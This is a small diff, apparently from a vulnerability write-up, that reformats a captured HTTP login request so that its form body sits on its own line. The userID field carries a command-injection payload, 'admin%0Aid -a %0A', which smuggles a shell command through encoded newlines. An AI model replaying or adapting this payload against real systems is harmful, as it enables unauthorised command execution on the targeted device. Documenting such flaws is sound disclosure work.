@@ -12,5 +12,7 @@ Sec-Fetch-Mode: navigate
 Sec-Fetch-Site: cross-site Pragma: no-cache Cache-Control: no-cache14 Te: trailers 
 Connection: close 
 Content-Type:application/x-www-form-urlencoded 
-Content-Length: 126 clsMode=cls_mode_login&index=index&log_type=report&page=login&rnd=0.7550103466497915&userID=admin%0Aid -a %0A&userPsw=tmbhuisq
+Content-Length: 126
+
+clsMode=cls_mode_login&index=index&log_type=report&page=login&rnd=0.7550103466497915&userID=admin%0Aid -a %0A&userPsw=tmbhuisq
 ```
